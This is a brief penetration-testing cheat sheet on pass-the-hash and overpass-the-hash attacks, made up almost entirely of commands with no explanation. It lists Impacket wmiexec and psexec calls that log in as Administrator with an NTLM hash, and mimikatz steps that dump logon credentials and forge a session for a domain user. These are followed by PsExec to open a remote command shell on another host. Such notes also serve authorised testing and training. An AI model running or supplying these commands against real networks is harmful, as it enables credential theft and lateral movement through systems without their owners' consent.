# (Over)Pass The Hash

#### Pass The Hash <a href="#pass-the-hash" id="pass-the-hash"></a>

```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

#### Overpass the Hash <a href="#overpass-the-hash" id="overpass-the-hash"></a>

```powershell
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

```
klist
net use \\files04
klist
.\PsExec.exe \\files04 cmd
```

